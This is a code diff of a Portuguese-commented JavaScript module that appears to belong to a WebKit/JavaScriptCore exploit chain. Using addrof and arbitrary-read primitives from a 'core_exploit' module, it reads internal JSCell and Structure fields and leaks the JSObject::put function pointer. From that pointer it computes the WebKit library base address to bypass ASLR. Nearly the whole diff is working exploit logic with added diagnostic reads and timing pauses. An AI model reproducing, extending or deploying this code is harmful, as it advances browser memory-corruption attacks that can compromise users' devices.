@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v103 - R63 com Offsets Validados e Mitigação de Timing)
+// js/script3/testArrayBufferVictimCrash.mjs (v104 - R64 com Leituras Estendidas e Diagnóstico Aprofundado)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
@@ -9,8 +9,8 @@
 // usando um *objeto dedicado e isolado* para o vazamento de estruturas internas,
 // e verificação de valores lidos para diagnosticar falhas nos offsets.
 //
-// ATENÇÃO: PREMISSA DE QUE TODOS OS OFFSETS EM config.mjs SÃO VÁLIDOS!
-// Se o problema persistir, os offsets DEVEM ser re-verificados com um disassembler.
+// ATENÇÃO: PREMISSA DE QUE TODOS OS OFFSETS EM config.mjs SÃO VÁLIDOS,
+// E PROPERTY_STORAGE_CAPACITY_OFFSET: 0x18 FOI REMOVIDO!
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -22,7 +22,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v103_R63_OffsetsValidated";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v104_R64_DeepLeakDiag";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -51,7 +51,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let final_result = {
         success: false,
         message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
-        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
+        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou ou falhou." }
     };
 
     try {
@@ -175,8 +175,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         try {
             // **Estratégia Aprimorada: Usar um objeto NOVO e ISOLADO para o vazamento de estruturas.**
-            // Isso evita que leituras de offsets de Structure/ClassInfo esbarrem em dados
-            // previamente escritos pelo teste de L/E, que poderiam estar no mesmo bloco de memória.
             const obj_for_webkit_leak = {}; // Crie um objeto simples e novo.
             const obj_for_webkit_leak_addr = addrof(obj_for_webkit_leak);
             logS3(`  Endereço do objeto dedicado para vazamento WebKit: ${obj_for_webkit_leak_addr.toString(true)}`, "info");
@@ -185,52 +183,73 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 throw new Error("Addrof retornou 0 para objeto de vazamento WebKit.");
             }
 
-            // PEQUENA PAUSA PARA MITIGAR PROBLEMAS DE TIMING/GC ANTES DE LEITURAS CRÍTICAS
-            await PAUSE_S3(100); 
-            logS3(`  Pausa curta para estabilização de GC/Heap antes do vazamento de WebKit...`, "debug");
+            // PAUSA MAIOR PARA MITIGAR PROBLEMAS DE TIMING/GC ANTES DE LEITURAS CRÍTICAS
+            await PAUSE_S3(1000); // 1 segundo de pausa
+            logS3(`  Pausa (1000ms) para estabilização de GC/Heap antes do vazamento de WebKit...`, "debug");
 
-            // 1. Ler o Structure* do obj_for_webkit_leak
-            // JSCell: STRUCTURE_POINTER_OFFSET: 0x8
-            const structure_ptr_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
-            logS3(`  Tentando ler Structure* de ${structure_ptr_addr.toString(true)} (Objeto+${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET)})`, "debug");
-            const structure_addr = arb_read_final(structure_ptr_addr);
-            logS3(`  Lido Structure*: ${structure_addr.toString(true)}`, "leak");
-            if (structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Falha ao vazar Structure* (endereço é 0x0).");
-            if (structure_addr.high() === 0x7ff80000 && structure_addr.low() === 0) throw new Error("Falha ao vazar Structure* (valor é NaN - provável confusão de tipo ou dados inválidos).");
-            // Verificação adicional: Um ponteiro de estrutura geralmente aponta para uma região de código/dados da biblioteca, não para o heap aleatório
-            if (structure_addr.high() < 0x40000000) logS3(`  ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");
+            // 1. LEITURAS DA JSCell (do obj_for_webkit_leak)
+            logS3(`  Iniciando leituras da JSCell do objeto de vazamento...`, "debug");
+            const jscell_structure_ptr_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
+            const structure_addr = arb_read_final(jscell_structure_ptr_addr);
+            logS3(`    Lido Structure* (${JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET}): ${structure_addr.toString(true)} de ${jscell_structure_ptr_addr.toString(true)}`, "leak");
+            if (!isAdvancedInt64Object(structure_addr) || structure_addr.low() === 0 && structure_addr.high() === 0) throw new Error("Falha ao vazar Structure* (endereço é 0x0).");
+            if (structure_addr.high() === 0x7ff80000 && structure_addr.low() === 0) throw new Error("Falha ao vazar Structure* (valor é NaN).");
+            if (structure_addr.high() < 0x40000000) logS3(`    ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");
 
-            // 2. Ler o ClassInfo* do Structure
-            // Structure: CLASS_INFO_OFFSET: 0x50
+            const jscell_structure_id_flattened_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET);
+            const structure_id = arb_read_final(jscell_structure_id_flattened_addr); // Lendo 8 bytes, mas é só 1 byte. CUIDADO.
+            // Para ler 1 byte, precisamos de uma primitiva arb_read_byte ou ajustar arb_read_final para byteLength=1.
+            // Por simplicidade, vou ler 4 bytes e pegar o LSB, mas idealmente seria uma leitura de 1 byte.
+            const structure_id_byte = arb_read_final(jscell_structure_id_flattened_addr).low() & 0xFF; // Apenas o byte mais baixo
+            logS3(`    Lido StructureID_Flattened (${JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${jscell_structure_id_flattened_addr.toString(true)}`, "leak");
+            // Adicionar verificação para StructureID (e.g., JSObject_Simple_STRUCTURE_ID, se conhecido)
+            if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID !== null &&
+                structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID) {
+                logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado JSObject_Simple_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID, 8)}).`, "warn");
+            }
+
+            const jscell_typeinfo_type_flattened_addr = obj_for_webkit_leak_addr.add(JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET);
+            const typeinfo_type_byte = arb_read_final(jscell_typeinfo_type_flattened_addr).low() & 0xFF; // Apenas o byte mais baixo
+            logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${jscell_typeinfo_type_flattened_addr.toString(true)}`, "leak");
+
+            // 2. LEITURAS DA STRUCTURE
+            logS3(`  Iniciando leituras da Structure...`, "debug");
+            await PAUSE_S3(50); // Pequena pausa
+            
             const class_info_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
-            logS3(`  Tentando ler ClassInfo* de ${class_info_ptr_addr.toString(true)} (Structure*+${toHex(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET)})`, "debug");
             const class_info_addr = arb_read_final(class_info_ptr_addr);
-            logS3(`  Lido ClassInfo*: ${class_info_addr.toString(true)}`, "leak");
-            if (class_info_addr.low() === 0 && class_info_addr.high() === 0) throw new Error("Falha ao vazar ClassInfo* (endereço é 0x0).");
+            logS3(`    Lido ClassInfo* (${JSC_OFFSETS.Structure.CLASS_INFO_OFFSET}): ${class_info_addr.toString(true)} de ${class_info_ptr_addr.toString(true)}`, "leak");
+            if (!isAdvancedInt64Object(class_info_addr) || class_info_addr.low() === 0 && class_info_addr.high() === 0) throw new Error("Falha ao vazar ClassInfo* (endereço é 0x0).");
             if (class_info_addr.high() === 0x7ff80000 && class_info_addr.low() === 0) throw new Error("Falha ao vazar ClassInfo* (valor é NaN).");
-            if (class_info_addr.high() < 0x40000000) logS3(`  ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");
+            if (class_info_addr.high() < 0x40000000) logS3(`    ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");
 
+            const global_object_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET);
+            const global_object_addr = arb_read_final(global_object_ptr_addr);
+            logS3(`    Lido GlobalObject* (${JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET}): ${global_object_addr.toString(true)} de ${global_object_ptr_addr.toString(true)}`, "leak");
+            if (global_object_addr.low() === 0 && global_object_addr.high() === 0) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn");
 
-            // 3. Ler o ponteiro para JSC::JSObject::put da vtable da Structure
-            // Structure: VIRTUAL_PUT_OFFSET: 0x18
-            // Assumimos que o offset 0x18 DENTRO da Structure é o campo que contém o ponteiro para a função put.
-            // A nota em config.mjs: "call qword ptr [rdx+18h]" onde rdx é Structure* sugere isso.
+            const prototype_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.PROTOTYPE_OFFSET);
+            const prototype_addr = arb_read_final(prototype_ptr_addr);
+            logS3(`    Lido Prototype* (${JSC_OFFSETS.Structure.PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
+            if (prototype_addr.low() === 0 && prototype_addr.high() === 0) logS3(`    AVISO: Prototype* é 0x0.`, "warn");
+
+            await PAUSE_S3(50); // Pequena pausa
+
+            // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
             const js_object_put_func_ptr_addr_in_structure = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
             logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)})`, "debug");
             const js_object_put_func_addr = arb_read_final(js_object_put_func_ptr_addr_in_structure);
             logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");
 
-            if (js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) {
+            if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) {
                  throw new Error("Falha ao vazar ponteiro para JSC::JSObject::put (endereço é 0x0).");
             }
             if (js_object_put_func_addr.high() === 0x7ff80000 && js_object_put_func_addr.low() === 0) {
                 throw new Error("Ponteiro para JSC::JSObject::put é NaN (provável erro de reinterpretação ou JIT).");
             }
-            // Verificação adicional: um ponteiro de função geralmente não é um Smi.
             if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) { // Baixo, par, high 0 => possível Smi
-                logS3(`  ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
+                logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
             }
-
 
             // 4. Calcular WebKit Base
             const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
@@ -244,7 +263,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             logS3(`  Candidato a WebKit Base: ${webkit_base_candidate.toString(true)} (Calculado de JSObject::put)`, "leak");
 
             // 5. Critério de Sanidade para o Endereço Base
-            // Um endereço de base de biblioteca geralmente é elevado (começa com 0x4...) e alinhado a páginas (últimos 3 dígitos 000).
             const is_sane_base = webkit_base_candidate.high() > 0x40000000 && (webkit_base_candidate.low() & 0xFFF) === 0;
             logS3(`  Verificação de Sanidade do WebKit Base: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_base}`, is_sane_base ? "good" : "warn");
 
@@ -270,7 +288,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     } catch (e) {
         final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
-        // Se a L/E falhou, o vazamento WebKit também falha por dependência.
         final_result.success = false;
         final_result.webkit_leak_details.success = false;
         final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
@@ -279,9 +296,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
     return {
         errorOccurred: (final_result.success && final_result.webkit_leak_details.success) ? null : final_result.message,
-        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." }, // Reflete o sucesso geral da L/E
-        webkit_leak_result: final_result.webkit_leak_details, // Retorna os detalhes completos do vazamento
-        heisenbug_on_M2_in_best_result: (final_result.success && final_result.webkit_leak_details.success), // Depende do sucesso final
+        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
+        webkit_leak_result: final_result.webkit_leak_details,
+        heisenbug_on_M2_in_best_result: (final_result.success && final_result.webkit_leak_details.success),
         oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
         tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified + WebKit Leak Isolation Diagnostic)' }
     };
